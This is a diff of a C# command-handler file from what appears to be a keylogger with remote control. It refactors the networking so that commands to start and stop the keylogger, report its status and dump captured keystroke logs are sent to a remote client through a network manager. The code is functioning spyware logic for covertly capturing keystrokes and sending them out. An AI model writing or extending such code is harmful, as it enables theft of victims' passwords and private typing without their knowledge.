@@ -1,5 +1,4 @@
 ﻿using KeyLogger;
-using NetworkManager;
 using System;
 using System.Collections.Generic;
 
@@ -43,7 +42,7 @@ namespace Commands
 
             if (args[0] == "status" || args[0] == "dump")
             {
-                Console.WriteLine(GlobalNetworkManager.ReadLine());
+                Console.WriteLine(CommandsManager.networkManager.ReadLine());
             }
         }
 
@@ -71,9 +70,9 @@ namespace Commands
         void StopKeylogger() => keyLoggerManager.StopListening();
 
         void SendKeyloggerStatusToClient() =>
-            GlobalNetworkManager.WriteLine(keyLoggerManager.GetStatus() ? "The keylogger is running" : "The keylogger isn't started");
+            CommandsManager.networkManager.WriteLine(keyLoggerManager.GetStatus() ? "The keylogger is running" : "The keylogger isn't started");
 
         void SendKeyLogsToClient() =>
-            GlobalNetworkManager.WriteLine(keyLoggerManager.DumpLogs());
+            CommandsManager.networkManager.WriteLine(keyLoggerManager.DumpLogs());
     }
 }
